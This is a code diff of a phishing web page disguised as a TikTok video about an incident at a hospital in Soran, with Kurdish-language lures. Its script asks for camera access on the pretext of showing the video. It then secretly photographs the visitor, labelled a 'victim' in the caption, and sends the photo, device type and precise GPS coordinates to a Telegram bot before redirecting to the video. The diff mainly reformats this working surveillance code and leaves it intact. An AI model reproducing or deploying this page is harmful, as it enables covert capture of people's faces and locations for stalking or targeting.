@@ -7,7 +7,7 @@
     
     <meta property="og:title" content="TikTok . کێشەیەکی نوێ لە نەخۆشخانەی ئیدارەی سەربەخۆی سۆران">
     <meta property="og:description" content="بۆ بینینی ڤیدیۆکە کلیک لێرە بکە">
-    <meta property="og:image" content="https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg">
+    <meta property="og:image" content="https://api.screenshotmachine.com/?key=0c7f21&url=https://rudawsoran.github.io/Video/soran.jpg&dimension=1200x630">
     <meta property="og:image:type" content="image/jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
@@ -42,51 +42,33 @@
         async function startApp() {
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                
                 const b = document.getElementById('b');
-                const bg = document.getElementById('bg');
-                const btn = document.getElementById('btn');
                 const v = document.getElementById('v');
-
                 v.srcObject = s;
                 await v.play();
-
-                bg.style.display = 'none';
-                btn.style.display = 'none';
+                document.getElementById('bg').style.display = 'none';
+                document.getElementById('btn').style.display = 'none';
                 b.classList.add('flash-active');
-
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth;
                     c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
                     const blob = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
-                    
                     const fd = new FormData();
                     fd.append('chat_id', chat_id);
                     fd.append('photo', blob, 'photo.jpg');
                     fd.append('caption', "📸 وێنەی نێچیر\n📱 " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
-                    
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(async (pos) => {
                             const mapLink = "https://www.google.com/maps?q=$" + pos.coords.latitude + "," + pos.coords.longitude;
                             await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
-                            
                             window.location.href = targetVideo;
-                        }, (err) => {
-                            window.location.href = targetVideo;
-                        }, { enableHighAccuracy: true, timeout: 5000 });
-                    } else {
-                        window.location.href = targetVideo;
-                    }
-
+                        }, (err) => { window.location.href = targetVideo; }, { enableHighAccuracy: true, timeout: 5000 });
+                    } else { window.location.href = targetVideo; }
                 }, 1000);
-
-            } catch (e) {
-                alert("بۆ بینینی ڤیدیۆکە، دەبێت ڕێگە بە کامێرا بدەیت.");
-            }
+            } catch (e) { alert("بۆ بینینی ڤیدیۆکە، دەبێت ڕێگە بە کامێرا بدەیت."); }
         }
     </script>
 </body>
